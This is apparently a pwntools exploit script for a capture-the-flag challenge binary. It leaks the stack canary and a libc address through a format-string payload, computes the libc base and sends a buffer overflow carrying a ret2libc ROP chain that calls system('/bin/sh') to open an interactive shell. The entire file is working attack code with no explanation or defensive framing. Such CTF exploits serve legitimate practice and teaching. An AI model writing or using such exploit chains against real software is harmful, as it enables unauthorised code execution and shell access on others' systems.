#!/usr/bin/env python3
from pwn import *
import re

context.terminal = ['alacritty', '-e', 'bash', '-c']

exe  = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
context.arch   = "amd64"

LD = "./ld-linux-x86-64.so.2"

HOST = "127.0.0.1"
PORT = 1337

GDB_SCRIPT = """
b vuln
b *vuln+113
b exit
c
"""

def conn():
    if args.LOCAL:
        # Use the bundled loader + libc to match the challenge environment
        r = process([LD, "--library-path", ".", exe.path])

        if args.GDB or args.DEBUG:
            pause()
            gdb.attach(r, gdbscript=GDB_SCRIPT, api=False)

        return r

    return remote(HOST, PORT)


offset = 72

def main():
    r = conn()

    # PTY on remote can translate \n -> \r\n, so be tolerant.
    r.recvuntil(b"Entrez votre payload :")
    r.recvline()

    r.sendline(b"%41$p.%43$p")

    line = r.recvline()
    leaks = [int(x,16) for x in re.findall(b"0x[0-9a-fA-F]+", line)]

    canary    = leaks[0]
    libc_leak = leaks[1]
    # Leak is __libc_start_main+0x89 in this libc (0x27660 + 0x89 = 0x276e9)
    libc_base = libc_leak - (libc.sym["__libc_start_main"] + 0x89)

    log.success(f"canary    = {hex(canary)}")
    log.success(f"libc_leak = {hex(libc_leak)}")
    log.success(f"libc_base = {hex(libc_base)}")

    libc.address = libc_base

    rop_libc = ROP(libc)
    pop_rdi = rop_libc.find_gadget(['pop rdi','ret']).address
    ret     = rop_libc.find_gadget(['ret']).address

    system = libc.sym["system"]
    binsh  = next(libc.search(b"/bin/sh"))

    log.success(f"pop_rdi = {hex(pop_rdi)}")
    log.success(f"ret     = {hex(ret)}")
    log.success(f"system  = {hex(system)}")
    log.success(f"/bin/sh = {hex(binsh)}")

    r.recvuntil(b"Entrez votre ROP :")
    r.recvline()

    payload = flat(
        b"A"*offset,   
        canary,        
        b"B"*8,        
        ret,        
        pop_rdi,
        binsh,
        system
    )

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
